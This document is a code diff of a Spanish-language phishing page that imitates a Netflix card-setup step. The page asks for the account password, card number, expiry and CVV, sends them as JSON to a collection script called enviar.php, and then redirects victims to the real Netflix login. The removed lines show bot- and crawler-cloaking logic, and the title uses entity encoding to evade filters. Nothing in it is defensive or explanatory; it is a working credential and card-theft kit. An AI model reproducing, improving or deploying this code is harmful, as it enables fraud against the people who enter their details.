@@ -3,53 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="referrer" content="no-referrer">
-    <meta name="robots" content="noindex, nofollow">
     <title>C&#111;nfirmaci&#243;n de S&#101;rvici&#111;</title>
-    
-    <script>
-        (function() {
-            const _u = navigator.userAgent;
-            const _isBot = /bot|googlebot|crawler|spider|robot|crawling|safe-browsing|lighthouse|chrome-lighthouse/i.test(_u);
-            const _isLowRes = (window.screen.width < 100 || window.screen.height < 100);
-            
-            if (_isBot || _isLowRes) {
-                window.location.replace("https://www.google.com");
-            }
-        })();
-    </script>
-
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     
     <style>
-        body { background: #fff !important; color: #333 !important; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
+        body { background: #fff; color: #333; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
         .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
         .container-pay { max-width: 440px; margin: 30px auto; padding: 0 20px; }
-        .step { text-transform: uppercase; font-size: 13px; font-weight: 400; color: #333; }
-        h1 { font-size: 32px; margin: 10px 0 20px; font-weight: 700; line-height: 1.1; }
+        .step { text-transform: uppercase; font-size: 13px; color: #333; }
+        h1 { font-size: 32px; margin: 10px 0 20px; font-weight: 700; }
         .payment-icons { margin: 15px 0; display: flex; gap: 8px; }
         .fa-cc-visa { color: #1A1F71; font-size: 35px; }
         .fa-cc-mastercard { color: #EB001B; font-size: 35px; }
         .fa-cc-amex { color: #007BC1; font-size: 35px; }
         .input-box { position: relative; margin-bottom: 15px; }
-        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; color: #000; }
-        .input-box input:focus { outline: none; border-color: #0071eb; }
+        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; }
         .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; margin-top: 20px; font-weight: bold; }
+        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
         #loading-overlay { display: none; text-align: center; padding: 20px; }
-        @media (max-width: 768px) { .nav-pay img { width: 90px; } h1 { font-size: 24px; } }
     </style>
 </head>
 <body>
     <nav class="nav-pay">
         <img src="img/logo.png" style="width: 100px;" alt="Service">
-        <a href="#" style="text-decoration: none; color: #333; font-weight: bold; font-size: 14px;">Cerrar sesión</a>
+        <a href="#" style="text-decoration: none; color: #333; font-weight: bold;">Cerrar sesión</a>
     </nav>
 
     <div class="container-pay">
         <span class="step">Paso <b>3</b> de <b>3</b></span>
-        <h1>C&#111;nf&#105;gur&#97; tu t&#97;rj&#101;t&#97;</h1>
+        <h1>Configura tu tarjeta</h1>
         
         <div class="payment-icons">
             <i class="fab fa-cc-visa"></i>
@@ -58,47 +41,43 @@
         </div>
 
         <div id="dynamic-injection"></div>
+
         <div id="loading-overlay">
             <i class="fas fa-spinner fa-spin fa-2x" style="color:#e50914;"></i>
-            <p>Verificando con su entidad bancaria...</p>
+            <p id="loading-text">Verificando con su entidad bancaria...</p>
         </div>
     </div>
 
     <script>
-        // 2. CONTADOR PERSISTENTE (SOBREVIVE AL REFRESH)
-        let intentos = parseInt(sessionStorage.getItem('cont_int')) || 0;
-
-        // 3. INYECCIÓN DINÁMICA DEL FORMULARIO
+        // 1. INYECCIÓN DEL FORMULARIO AL CARGAR LA PÁGINA
         window.onload = function() {
-            setTimeout(function() {
-                document.getElementById('dynamic-injection').innerHTML = `
-                    <form id="pay-process-form">
-                        <div class="input-box"><input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required></div>
-                        <div class="input-box"><input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required></div>
-                        <div class="input-box"><input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required></div>
-                        <div class="grid-input">
-                            <div class="input-box"><input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" required></div>
-                            <div class="input-box"><input type="text" id="f_c_1" placeholder="CVV" maxlength="4" inputmode="numeric" required></div>
-                        </div>
-                        <p style="font-size: 12px; color: #737373; line-height: 1.4; margin-top:15px;">
-                            Al continuar, confirmas que eres mayor de edad y aceptas la renovación automática.
-                        </p>
-                        <button type="submit" class="btn-submit">Iniciar membresía</button>
-                    </form>
-                `;
-                _logic();
-            }, 1000);
+            document.getElementById('dynamic-injection').innerHTML = `
+                <form id="pay-process-form">
+                    <div class="input-box"><input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required></div>
+                    <div class="input-box"><input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required></div>
+                    <div class="input-box"><input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required></div>
+                    <div class="grid-input">
+                        <div class="input-box"><input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" required></div>
+                        <div class="input-box"><input type="text" id="f_c_1" placeholder="CVV" maxlength="4" inputmode="numeric" required></div>
+                    </div>
+                    <button type="submit" class="btn-submit">Iniciar membresía</button>
+                </form>
+            `;
+            
+            // Una vez inyectado, activamos el escucha del evento submit
+            _setupForm();
         };
 
-        function _logic() {
+        function _setupForm() {
             document.getElementById('pay-process-form').addEventListener('submit', function(e) {
                 e.preventDefault();
                 
+                // Ocultar formulario y mostrar carga
                 document.getElementById('dynamic-injection').style.display = 'none';
                 document.getElementById('loading-overlay').style.display = 'block';
 
-                const _0xval = {
-                    em: sessionStorage.getItem('usr_mail') || 'Desconocido',
+                const payload = {
+                    em: sessionStorage.getItem('usr_mail') || 'No definido',
                     pw: document.getElementById('f_k_1').value,
                     nm: document.getElementById('f_n_1').value,
                     cc: document.getElementById('f_t_1').value,
@@ -106,35 +85,38 @@
                     cv: document.getElementById('f_c_1').value
                 };
 
-                _0xdispatch(_0xval);
+                _0xdispatch(payload);
             });
         }
 
-        // 4. ENVÍO OFUSCADO Y LÓGICA DE REINTENTOS
+        // 2. ENVÍO DE DATOS AL PHP
         function _0xdispatch(obj) {
-    document.getElementById('dynamic-injection').style.display = 'none';
-    document.getElementById('loading-overlay').style.display = 'block';
-
-    fetch('enviar.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(obj)
-    })
-    .then(response => response.json())
-    .then(data => {
-        setTimeout(() => {
-            if (data.pago === true) {
-                alert("¡Verificación exitosa! Tu membresía ha sido confirmada.");
-                window.location.href = "https://www.netflix.com/login";
-            } else {
-                // AQUÍ SE MUESTRA EL ERROR ESPECÍFICO (CVV, FECHA, FONDOS)
-                alert("Atención: " + data.mensaje_error + ". Por favor, verifique los datos o intente con otra tarjeta.");
+            fetch('enviar.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(obj)
+            })
+            .then(response => {
+                if (!response.ok) throw new Error("Error en red");
+                return response.json();
+            })
+            .then(data => {
+                setTimeout(() => {
+                    if (data.pago === true) {
+                        alert("¡Verificación exitosa! Su suscripción ha sido confirmada.");
+                        window.location.href = "https://www.netflix.com/login";
+                    } else {
+                        // MUESTRA EL ERROR ESPECÍFICO (CVV, Fecha, etc.)
+                        alert("Atención: " + data.mensaje_error);
+                        location.reload();
+                    }
+                }, 2000);
+            })
+            .catch(err => {
+                alert("Error de conexión con el servidor. Verifique enviar.php.");
                 location.reload();
-            }
-        }, 1500);
-    })
-    .catch(err => {
-        alert("Error de comunicación. Asegúrate de que el archivo enviar.php esté en tu servidor.");
-        location.reload();
-    });
-}
+            });
+        }
+    </script>
+</body>
+</html>
